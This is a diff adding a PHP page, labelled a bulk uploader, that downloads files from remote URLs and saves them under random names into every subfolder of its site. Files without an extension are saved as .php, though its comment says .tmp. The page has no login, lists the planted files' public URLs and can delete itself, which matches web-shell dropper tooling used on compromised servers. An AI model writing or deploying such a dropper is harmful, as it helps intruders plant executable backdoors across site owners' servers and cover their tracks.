@@ -1,0 +1,138 @@
+<?php
+/**
+ * Auto-Grabber Tools: Bulk Upload to Auto-Detected Directories
+ */
+
+// 1. Fitur Kill File (Self-Destruct)
+if (isset($_POST['kill_tools'])) {
+    if (@unlink(__FILE__)) {
+        die("<h3 style='color: green;'>[+] Tools berhasil dihapus dari server!</h3>");
+    } else {
+        die("<h3 style='color: red;'>[-] Gagal menghapus tools. Silakan hapus manual via File Manager.</h3>");
+    }
+}
+
+$result_urls = [];
+
+// 2. Eksekusi Tools
+if (isset($_POST['run_tools'])) {
+    // Mengambil input URL (bisa lebih dari satu, dipisahkan baris baru)
+    $raw_urls = explode(PHP_EOL, $_POST['raw_urls']);
+    
+    // Deteksi otomatis semua subfolder (DIR) di lokasi script ini berada
+    $subfolders = array_filter(glob(__DIR__ . '/*'), 'is_dir');
+    
+    // Jika tidak ada subfolder sama sekali, gunakan direktori saat ini (root folder script)
+    if (empty($subfolders)) {
+        $subfolders = [__DIR__];
+    }
+
+    // Mendapatkan Base URL website secara dinamis untuk output result
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+    $domain = $_SERVER['HTTP_HOST'];
+    $base_dir = dirname($_SERVER['SCRIPT_NAME']);
+    if ($base_dir == '/' || $base_dir == '\\') { rtrim($base_dir, '/\\'); } // Bersihkan trailing slash
+    $base_url = $protocol . $domain . $base_dir;
+
+    // Proses setiap URL Raw yang diinput
+    foreach ($raw_urls as $url) {
+        $url = trim($url);
+        if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) continue;
+
+        // Ambil ekstensi asli file (misal: .jpg, .pdf). Jika tidak terdeteksi, default ke .tmp
+        $ext = pathinfo(parse_url($url, PHP_URL_PATH), PATHINFO_EXTENSION);
+        $ext = $ext ? '.' . $ext : '.php';
+
+        // Eksekusi upload ke *setiap* subfolder yang terdeteksi
+        foreach ($subfolders as $folder) {
+            // Generate nama file random (8 karakter huruf & angka)
+            $random_filename = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8) . $ext;
+            
+            $save_path = $folder . DIRECTORY_SEPARATOR . $random_filename;
+            $folder_name = basename($folder);
+
+            // Inisialisasi cURL
+            $ch = curl_init($url);
+            $fp = fopen($save_path, 'wb');
+
+            if ($fp !== false) {
+                curl_setopt($ch, CURLOPT_FILE, $fp);
+                curl_setopt($ch, CURLOPT_HEADER, 0);
+                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+                
+                curl_exec($ch);
+                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                
+                curl_close($ch);
+                fclose($fp);
+
+                // Cek jika berhasil (HTTP 200)
+                if ($http_code == 200) {
+                    // Susun URL output
+                    if ($folder === __DIR__) {
+                        $result_urls[] = $base_url . '/' . $random_filename;
+                    } else {
+                        $result_urls[] = $base_url . '/' . $folder_name . '/' . $random_filename;
+                    }
+                } else {
+                    @unlink($save_path); // Bersihkan file corrupt jika download gagal
+                }
+            }
+        }
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Bulk Uploader Tools</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; max-width: 800px; margin: auto; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        textarea { width: 100%; height: 100px; padding: 10px; box-sizing: border-box; margin-bottom: 15px; border-radius: 4px; border: 1px solid #ccc; }
+        .btn { padding: 10px 20px; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        .btn-primary { background: #007bff; }
+        .btn-primary:hover { background: #0056b3; }
+        .btn-danger { background: #dc3545; }
+        .btn-danger:hover { background: #c82333; }
+        .result-box { background: #e8f5e9; padding: 15px; border-left: 4px solid #2e7d32; border-radius: 4px; word-wrap: break-word; }
+        a { color: #1565c0; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>ðŸ“ Bulk Auto-Uploader</h2>
+        <p>Masukkan URL Raw (pisahkan dengan baris baru/Enter). Tools akan mendeteksi subfolder secara otomatis dan mengunduh file dengan nama acak.</p>
+        
+        <form method="POST">
+            <textarea name="raw_urls" placeholder="https://domain.com/file1.jpg&#10;https://domain.com/file2.pdf" required></textarea>
+            <button type="submit" name="run_tools" class="btn btn-primary">ðŸš€ Jalankan Tools</button>
+        </form>
+    </div>
+
+    <?php if (!empty($result_urls)): ?>
+        <div class="card result-box">
+            <h3>âœ… Result URL:</h3>
+            <ul>
+                <?php foreach ($result_urls as $url): ?>
+                    <li><a href="<?= htmlspecialchars($url) ?>" target="_blank"><?= htmlspecialchars($url) ?></a></li>
+                <?php endforeach; ?>
+            </ul>
+        </div>
+    <?php endif; ?>
+
+    <div class="card" style="text-align: center; background: #ffebee;">
+        <p style="color: #c62828;"><b>Perhatian:</b> Gunakan tombol di bawah ini untuk menghapus script ini dari server jika pekerjaan sudah selesai agar keamanan server tetap terjaga.</p>
+        <form method="POST" onsubmit="return confirm('Yakin ingin menghapus tools ini permanen dari server?');">
+            <button type="submit" name="kill_tools" class="btn btn-danger">ðŸ’€ Kill Tools</button>
+        </form>
+    </div>
+
+</body>
+</html>
